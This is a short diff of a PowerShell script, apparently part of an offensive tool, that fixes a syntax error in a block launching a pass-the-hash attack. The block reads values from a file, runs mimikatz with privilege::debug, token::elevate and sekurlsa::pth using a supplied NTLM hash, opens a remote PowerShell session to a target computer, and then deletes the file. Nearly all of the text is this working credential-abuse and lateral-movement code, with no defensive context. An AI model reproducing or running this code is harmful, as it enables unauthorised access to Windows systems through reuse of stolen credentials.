@@ -152,7 +152,7 @@ function EnableTLS {
       } until ($input -in '1','2','3','4')
 
    $Host.UI.RawUI.ForegroundColor = 'Gray'
-   if(Test-Path variable:PassTheHash) { = powershell "Get-Content file.txt | Out-String | ConvertFrom-StringData | Format-List | findstr 'Value'"
+   if(Test-Path variable:PassTheHash) { powershell "Get-Content file.txt | Out-String | ConvertFrom-StringData | Format-List | findstr 'Value'"
    $RDP = "New-PSSession -Computer $computer"
    $cmd = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $RDP' exit"
    powershell $mimipath\mimikatz.exe $cmd ; Write-Host "" ; del file.txt }
